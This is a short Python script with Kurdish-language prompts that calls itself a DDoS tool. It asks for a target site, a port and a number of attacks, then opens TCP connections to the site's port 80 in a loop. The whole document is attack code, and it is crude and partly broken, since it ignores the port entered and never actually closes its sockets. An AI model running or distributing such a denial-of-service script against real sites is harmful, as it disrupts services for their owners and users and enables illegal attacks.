import sys
import time
import os 
import socket
import string


host = input("Nawe Site: ")

ip = socket.gethostbyname(host)

port = input("Porte chand: ")

conn = input("Chand Ddos brwat? : ")
intconn = int(conn)


def dos():
	ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
	    ddos.connect((host, 80))
	except socket.error as msg:
	    print(" ddos failed")
	print(" ddos rosht ")
	ddos.close
for i in range(1, intconn):
    dos()